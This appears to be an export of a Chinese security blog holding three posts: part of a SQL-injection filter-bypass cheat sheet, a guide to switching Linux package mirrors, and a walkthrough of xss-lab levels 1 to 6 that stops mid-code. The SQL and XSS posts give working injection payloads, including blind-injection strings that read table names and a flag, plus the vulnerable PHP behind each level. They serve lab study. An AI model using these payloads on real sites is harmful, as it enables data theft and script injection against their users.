换行符绕过</h4><p>换行符，可以起到一个换行得作用，比如：\n \d<br>常用的换行符经过url编码后：%0a %0b %0c %0d<br>为什么需要url编码：如果不进行url编码，程序会把\n当作一个字符，也就是说不能起到换行的作用，换行符需要url编码一下，经过php时，php会自动解码，就变成了一个换行符。<br>payload：<code>username=dir&#39;%0aunion%0aselect%0a1,2,3%23&amp;password=admin</code><br>把空格用换行符替换即可，小技巧：可以先打空格，然后搜索替换成换行符的url编码</p><h4 id="1-2-注释符绕过"><a href="#1-2-注释符绕过" class="headerlink" title="1.2 注释符绕过"></a>1.2 注释符绕过</h4><p>用注释符代替空格，把所有的空格替换换行符就行，但必须多行注释，因为需要闭合，如果单行注释拿后面的语句会被注释掉，多行注释：<code>/**/</code><br>payload：<code>username=dir&#39;/**/union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema=database()%23&amp;password=admin</code></p><h4 id="1-3-括号绕过"><a href="#1-3-括号绕过" class="headerlink" title="1.3 括号绕过"></a>1.3 括号绕过</h4><p>括号在MySQL是用来包围子查询的，任何可以计算出结果的语句，都可以用括号包裹；括号绕过和上面两个利用方法不同。<br>select()1;错误<br>select(1);正确<br>payload：<code>id=(1)and(if(((ascii(substr(database(),1,1)))=119),1,0))%23</code><br>因为union联合查询不能使用括号，所有只能使用布尔报错盲注。<br>加入select查询的pyaload：<code>id=(1)and(if(((ascii(substr((select(flag)from(flag)),1,1)))=1),1,0))%23</code></p><h3 id="2-逗号过滤绕过"><a href="#2-逗号过滤绕过" class="headerlink" title="2. 逗号过滤绕过"></a>2. 逗号过滤绕过</h3><p>sql注入中需要使用到逗号的三个地方：函数的参数分割使用逗号，limit使用逗号，union联合查询使用逗号，但后台对逗号进行了过滤，就得绕过过滤规则。<br>实例：substr(str,1,1) | limit 0,1 | union select 1,2,3</p><h4 id="2-1-from-for绕过"><a href="#2-1-from-for绕过" class="headerlink" title="2.1 from for绕过"></a>2.1 from for绕过</h4><p>from for 主要是用在函数内，用来截取第几个字符；from for主要是用于绕过substr的逗号,主要用于盲注。<br>用法：substr(database()form x for y) 从x开始截取y个字符，x相当于substr的参数2，y相当于substr的参数3。<br><img src="https://img.xpctf.cn/img/20200629161921.png"><br>payload：<code>id=1 and ascii(substr((select flag from flag)from 1 for 1))=102</code></p><h4 id="2-2-limit-offset绕过"><a href="#2-2-limit-offset绕过" class="headerlink" title="2.2 limit offset绕过"></a>2.2 limit offset绕过</h4><p>limit offset绕过使用场景：当过滤了group_concat和limit 0,1时，可以使用limit offset绕过。<br>用法：limit rouw_count offset offser；rou_count返回多少行，offset 偏移量，就是从第几行开始返回，从0开始。刚好和limit 0,1反过来。<br><img src="https://img.xpctf.cn/img/20200629173734.png"><br>payload原型：<code>id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=&#39;web&#39; limit 0,1),1,1))=102</code><br>payload绕过：<code>id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=&#39;web&#39; limit 1 offset 0)from 1 for 1))=102</code></p><h4 id="2-4-join绕过"><a href="#2-4-join绕过" class="headerlink" title="2.4 join绕过"></a>2.4 join绕过</h4><p>派生表：MySQL在进行子查询是，会产生一个派生表，他的sqlect语句产生一个虚拟表，也外部没有关系，产生的结果传给外部的select查询。<br>实例：select * from ((select 1)a,(select 2)b);<br>使用join连接派生表，在通过子查询来查询我们想要的结果。在回显位里面构造sql语句即可获取数据库中的所有数据。<br>payload：<code>dir&#39; union select * from ((select 1)a join (select database())b join (select 3)c)%23</code></p><h3 id="3-等于号绕过"><a href="#3-等于号绕过" class="headerlink" title="3. 等于号绕过"></a>3. 等于号绕过</h3><p>等号使用场景：&#x3D;主要用于盲注中，用来判断数据的大小是否相等，所以我们可以从判断数据大小的角度入手，找到绕过方法。</p><h4 id="3-1-大小于号绕过"><a href="#3-1-大小于号绕过" class="headerlink" title="3.1 大小于号绕过"></a>3.1 大小于号绕过</h4><p><code>&gt;  &lt;</code>号是用来进行数据比较的，可以使用大小于号绕过。<br>第一种：<code>id=1 and ascii(substr((select database()),1,1))&gt;119%23</code><br>如果使用递增方式，当回显异常时数据正确；如果使用递减方式，当回显正常时数据+1正确<br>第二种：<code>id=1 and ascii(substr((select database()),1,1))&lt;119%23</code><br>如果使用递增方式，当回显正常时数据-1正确；如果使用递减方式，当回显异常时数据正确<br>第三种：<code>id=1 and ascii(substr((select database()),1,1))&lt;&gt;119%23</code><br>当两者不等时，返回正常；当两者相等时，返回异常。返回异常则数据正确<br>第四种：<code>id=1 and !(ascii(substr((select database()),1,1))&lt;&gt;119)%23</code><br>使用非运行达到相等的结果，虽然有点抽象，但理解后就是等号的效果</p><h4 id="3-2-strcmp函数绕过"><a href="#3-2-strcmp函数绕过" class="headerlink" title="3.2 strcmp函数绕过"></a>3.2 strcmp函数绕过</h4><p>strcmp函数 用来比较两个字符串或数字，如果相等返回0。还有-1和1的返回值，这里就用0<br>payload：<code>id=1 and strcmp((ascii(substr((select database()),1,1))),119)</code></p><h4 id="3-3-in函数"><a href="#3-3-in函数" class="headerlink" title="3.3 in函数"></a>3.3 in函数</h4><p>in函数 查询文字是否在字符串中存在，存在返回1，不存在返回0<br>paylaod：<code>id=1 and ascii(substr((select database()),1,1)) in (119)</code></p><h3 id="4-异或注入"><a href="#4-异或注入" class="headerlink" title="4. 异或注入"></a>4. 异或注入</h3><p>异或注入 主要用于检测关键字是否被过滤，在之前绕过waf的学习中，都是提示了某些关键字是否被过滤；如果不提示，该如何去判断关键字是否被过滤。<br>第一种：挨个试，把每个关键字都输入一遍，如果访问失败和关键字被过滤的返回结果一样，就无法判断关键字是否被过滤。<br>第二种：异或注入</p><h4 id="4-1-异或"><a href="#4-1-异或" class="headerlink" title="4.1 异或"></a>4.1 异或</h4><p>什么是异或：相同返回0，不同返回非0<br>用法：select 1^2;</p><h4 id="4-2-payload分析"><a href="#4-2-payload分析" class="headerlink" title="4.2 payload分析"></a>4.2 payload分析</h4><p>payload：<code>id=1 ^ (length(&#39;union&#39;)=5)</code><br>当union被过滤时，length(‘union’)的长度不等于5，返回0；1^0返回1，此时有输出<br>当union未过滤时，length(‘union’)的长度等于5，返回1；1^1返回0，此时无输出<br>结论：当关键词过过滤时，回显正常；当关键词未被过滤时，回显异常<br>期待结果：回显异常</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux国内更新源-通用</title>
      <link href="/posts/295e/"/>
      <url>/posts/295e/</url>
      
        <content type="html"><![CDATA[<h2 id="一、更换国内源"><a href="#一、更换国内源" class="headerlink" title="一、更换国内源"></a>一、更换国内源</h2><h3 id="1-Debian"><a href="#1-Debian" class="headerlink" title="1.Debian"></a>1.Debian</h3><p>备份当前源：mv &#x2F;etc&#x2F;apt&#x2F;sources.list &#x2F;etc&#x2F;apt&#x2F;sources.list.bak<br>编辑更新源：vim &#x2F;etc&#x2F;apt&#x2F;sources.list<br>按 “i” 进入插入模式，编辑完成按”ESC”退出编辑模式，输入”:wq”保存文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">阿里云</span></span><br><span class="line">deb http://mirrors.aliyun.com/debian/ stretch main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/debian/ stretch main non-free contrib</span><br><span class="line">deb http://mirrors.aliyun.com/debian-security stretch/updates main</span><br><span class="line">deb-src http://mirrors.aliyun.com/debian-security stretch/updates main</span><br><span class="line">deb http://mirrors.aliyun.com/debian/ stretch-updates main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/debian/ stretch-updates main non-free contrib</span><br><span class="line">deb http://mirrors.aliyun.com/debian/ stretch-backports main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/debian/ stretch-backports main non-free contrib</span><br></pre></td></tr></table></figure><p>Debian其他更新源：<a href="https://www.cnblogs.com/xueheng36/p/11027284.html">Debian GNU&#x2F;Linux 换源</a></p><h3 id="2-Ubuntu"><a href="#2-Ubuntu" class="headerlink" title="2.Ubuntu"></a>2.Ubuntu</h3><p>备份当前源：mv &#x2F;etc&#x2F;apt&#x2F;sources.list &#x2F;etc&#x2F;apt&#x2F;sources.list.bak<br>编辑更新源：vim &#x2F;etc&#x2F;apt&#x2F;sources.list<br>按 “i” 进入插入模式，编辑完成按”ESC”退出编辑模式，输入”:wq”保存文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">阿里云</span></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure><p>Ubuntu其他更新源：<a href="https://www.cnblogs.com/boundless-sky/p/11576373.html">Ubuntu18.04更换国内源（阿里，网易，中科大，清华等源</a></p><h3 id="3-Kali"><a href="#3-Kali" class="headerlink" title="3.Kali"></a>3.Kali</h3><p>备份当前源：mv &#x2F;etc&#x2F;apt&#x2F;sources.list &#x2F;etc&#x2F;apt&#x2F;sources.list.bak<br>编辑更新源：vim &#x2F;etc&#x2F;apt&#x2F;sources.list<br>按 “i” 进入插入模式，编辑完成按”ESC”退出编辑模式，输入”:wq”保存文件<br>阿里云更新源：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">阿里云</span></span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">Kali其他更新源：我与Kali-Linux：换源（更换国内源）</span><br></pre></td></tr></table></figure><h3 id="4-Centos"><a href="#4-Centos" class="headerlink" title="4.Centos"></a>4.Centos</h3><p>参考文章：<a href="https://blog.csdn.net/weixin_43731793/article/details/91349271">Linux：centos7 更新源</a></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss-lab闯关笔记</title>
      <link href="/posts/475/"/>
      <url>/posts/475/</url>
      
        <content type="html"><![CDATA[<h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p><strong>无过滤</strong></p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p><h3 id="前台代码"><a href="#前台代码" class="headerlink" title="前台代码"></a>前台代码</h3><p><code>&lt;h2 align=center&gt;欢迎用户’”&lt;&gt;?Die&lt;/h2&gt;&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;</code></p><h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><p>观察我们输入的字符串<code>’”&lt;&gt;?Die</code>，没有做任何编码就输出到前台，考虑后台可能没有做任何过滤和编码。</p><h3 id="后台代码"><a href="#后台代码" class="headerlink" title="后台代码"></a>后台代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;欢迎用户&quot;</span>.<span class="variable">$str</span>.<span class="string">&quot;&lt;/h2&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><h4 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h4><p><code>$str = $_GET[&quot;name&quot;];</code>获取前台传来的name变量赋值给<code>$str</code><br><code>echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;</code>没有做任何过滤直接将<code>$str</code>拼接到h2标签中输出，由此可见构成XSS漏洞。</p><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p><strong>构造闭合</strong></p><h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><p><code>Die&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</code></p><h3 id="前台代码-1"><a href="#前台代码-1" class="headerlink" title="前台代码"></a>前台代码</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>没有找到和&#x27;<span class="symbol">&amp;quot;</span><span class="symbol">&amp;lt;</span><span class="symbol">&amp;gt;</span>()Die相关的结果.<span class="tag">&lt;/<span class="name">h2</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">level2.php</span> <span class="attr">method</span>=<span class="string">GET</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;&#x27;&quot;</span>&gt;</span>()Die&quot;&gt;</span><br></pre></td></tr></table></figure><h4 id="代码分析-2"><a href="#代码分析-2" class="headerlink" title="代码分析"></a>代码分析</h4><p>观察我们输入的字符串<code>’”&lt;&gt;?Die</code>，<code>&lt;h2&gt;</code>标签中把<code>&quot;&lt;&gt;</code>实体编码了，继续搜索Die看到<code>&lt;input&gt;</code>标签没有被过滤，构造<code>&lt;input&gt;</code>闭合即可形成XSS。</p><h3 id="后台代码-1"><a href="#后台代码-1" class="headerlink" title="后台代码"></a>后台代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level2.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;&quot;&gt;</span></span><br></pre></td></tr></table></figure><h4 id="代码分析-3"><a href="#代码分析-3" class="headerlink" title="代码分析"></a>代码分析</h4><p><code>&lt;h2&gt;</code>标签中使用<code>htmlspecialchars</code>函数进行了编码，但我们发现<code>&lt;input&gt;</code>是直接使用<code>$str</code>拼接的，构造payload闭合<code>&lt;input&gt;</code>即可造成XSS。</p><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p><strong>构造闭合、绕过编码</strong></p><h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h3><p><code>Die&#39; onclick=&#39;alert(1)&#39;&gt;</code></p><h3 id="前台代码-2"><a href="#前台代码-2" class="headerlink" title="前台代码"></a>前台代码</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>没有找到和&#x27;<span class="symbol">&amp;quot;</span><span class="symbol">&amp;lt;</span><span class="symbol">&amp;gt;</span>()Die相关的结果.<span class="tag">&lt;/<span class="name">h2</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">level3.php</span> <span class="attr">method</span>=<span class="string">GET</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&#x27;&#x27;</span>&amp;<span class="attr">quot</span>;&amp;<span class="attr">lt</span>;&amp;<span class="attr">gt</span>;()<span class="attr">Die</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure><h4 id="代码分析-4"><a href="#代码分析-4" class="headerlink" title="代码分析"></a>代码分析</h4><p>根据level2的经验，猜测<code>&lt;input&gt;</code>已进行<code>htmlspecialchars</code>编码，使用<code>onclick</code>点击动作执行js，输入后点击编辑框造成XSS。</p><h3 id="后台代码-2"><a href="#后台代码-2" class="headerlink" title="后台代码"></a>后台代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&quot;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level3.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&#x27;&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;&#x27;&gt;</span></span><br></pre></td></tr></table></figure><h4 id="代码分析-5"><a href="#代码分析-5" class="headerlink" title="代码分析"></a>代码分析</h4><p><code>htmlspecialchars</code>对<code>&quot;&lt;&gt;</code>进行编码，只要不使用到这几个符号就能绕过<code>htmlspecialchars</code>编码过滤，造成XSS。</p><h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p><strong>构造闭合、绕过编码、单双引号</strong></p><h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h3><p><code>Die&quot; onclick=&#39;alert(1)&#39;&gt;</code></p><h3 id="前台代码-3"><a href="#前台代码-3" class="headerlink" title="前台代码"></a>前台代码</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>没有找到和&#x27;<span class="symbol">&amp;quot;</span><span class="symbol">&amp;lt;</span><span class="symbol">&amp;gt;</span>()Die相关的结果.<span class="tag">&lt;/<span class="name">h2</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">level4.php</span> <span class="attr">method</span>=<span class="string">GET</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;&#x27;&quot;</span>()<span class="attr">Die</span>&quot;&gt;</span></span><br></pre></td></tr></table></figure><h4 id="代码分析-6"><a href="#代码分析-6" class="headerlink" title="代码分析"></a>代码分析</h4><p><code>&lt;h2&gt;</code>标签就被进行是<code>htmlspecialchars</code>编码，没法构造闭合。我们看<code>&lt;input&gt;</code>标签，直接把<code>&lt;&gt;</code>给干掉了，所以不能用<code>&lt;&gt;</code>，感觉和level3相似。直接输入level3的payload试试。无果，<code>&gt;</code>被干掉了。后来我又发现<code>value=&quot;</code>后面是双引号，第三题是单引号。直接把单引号换成双引号即可。后面的<code>&gt;</code>被干掉也没事，本身还有一个<code>&gt;</code></p><h3 id="后台代码-3"><a href="#后台代码-3" class="headerlink" title="后台代码"></a>后台代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level4.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str3</span>.<span class="string">&#x27;&quot;&gt;</span></span><br></pre></td></tr></table></figure><h4 id="代码分析-7"><a href="#代码分析-7" class="headerlink" title="代码分析"></a>代码分析</h4><p>阅读代码发现传入的参数被用<code>str_replace</code>函数把<code>&lt;&gt;</code>替换为空后使用<code>htmlspecialchars</code>函数编码后拼接到<code>&lt;input&gt;</code>标签输出。我们把level3的payload中的单引号<code>&#39;</code>改成双引号<code>&quot;</code>即可造成XSS，但我感觉这是非预期解法，谷歌一波。<br>后来在<a href="https://www.cnblogs.com/xiaomeng2333/p/11595786.html">这里</a>找到了解法，绕过<code>&lt;&gt;</code>检测，构造<code>onmouseover</code>事件，事件会在鼠标指针移动到指定的元素上时发生。构造语句闭合，成功执行javascript语句。payload：<code>Die&quot; onmouseover=&quot;javascript:alert(1)&quot;</code></p><h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><p><strong>使用a标签，href伪协议即可绕过检测</strong></p><h3 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h3><p><code>Die&quot;&gt; &lt;a href=&#39;javascript:alert(1)&#39;&gt;&quot;</code></p><h3 id="前台代码-4"><a href="#前台代码-4" class="headerlink" title="前台代码"></a>前台代码</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>没有找到和die<span class="symbol">&amp;quot;</span> onclick=&#x27;alert(1)&#x27;相关的结果.<span class="tag">&lt;/<span class="name">h2</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">level5.php</span> <span class="attr">method</span>=<span class="string">GET</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;die&quot;</span> <span class="attr">o_nclick</span>=<span class="string">&#x27;alert(1)&#x27;</span>&quot;&gt;</span></span><br></pre></td></tr></table></figure><h4 id="代码分析-8"><a href="#代码分析-8" class="headerlink" title="代码分析"></a>代码分析</h4><p>直接输入level4的payload，发现<code>onclick</code>的o和n中间加了一个下划线，导致<code>onclick</code>不能正常解释。猜测只要有on就会被加<code>_</code>，试了一下果真如此，尝试大小写绕过，无果，全局小写。然后想到的就是找一个类似功能的来实现XSS，但我html基础太差。度娘吧~<br>百度搜索”html事件属性”，全是on开头， 阿巴阿巴~  后来看了大佬的思路，发现没有对尖括号过滤，构造pyaload:<code>Die&quot; &lt;script&gt;alert(1)&lt;/script&gt;</code>提交，发现又对script进行了处理。<br>因为我们可以构造闭合，所以构造一个a标签，使用伪协议绕过。<code>javascript</code>中也有<code>script</code>，为啥不过滤呢？小小的脑子，大大的诱惑！<br><img src="https://img.xpctf.cn/img/20200606191338.png"></p><h3 id="后台代码-4"><a href="#后台代码-4" class="headerlink" title="后台代码"></a>后台代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level5.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str3</span>.<span class="string">&#x27;&quot;&gt;</span></span><br></pre></td></tr></table></figure><h4 id="代码分析-9"><a href="#代码分析-9" class="headerlink" title="代码分析"></a>代码分析</h4><p>看了后台代码，上面提出的问题自然就解决了，后台只过滤固定的<code>&lt;script</code>，而<code>javascript</code>不符合规则，所以能绕过。解题思路已经在上面给出了，使用a标签即可实现XSS漏洞。</p><h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><p><strong>大写绕过</strong></p><h3 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h3><p><code>Die&quot; Onclick=&#39;alert(1)&#39;</code></p><h3 id="前台代码-5"><a href="#前台代码-5" class="headerlink" title="前台代码"></a>前台代码</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>没有找到和on <span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span> href相关的结果.<span class="tag">&lt;/<span class="name">h2</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">level6.php</span> <span class="attr">method</span>=<span class="string">GET</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;o_n &lt;scr_ipt&gt; hr_ef&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="代码分析-10"><a href="#代码分析-10" class="headerlink" title="代码分析"></a>代码分析</h4><p>根据level5的经验，直接输入<code>on &lt;script&gt; herf</code>点击搜索，结果可想而知，全部被干掉了。尝试大小写绕过，<code>Href On &lt;Script&gt;</code>大小写可以绕过，喜出望外。</p><h3 id="后台代码-5"><a href="#后台代码-5" class="headerlink" title="后台代码"></a>后台代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span 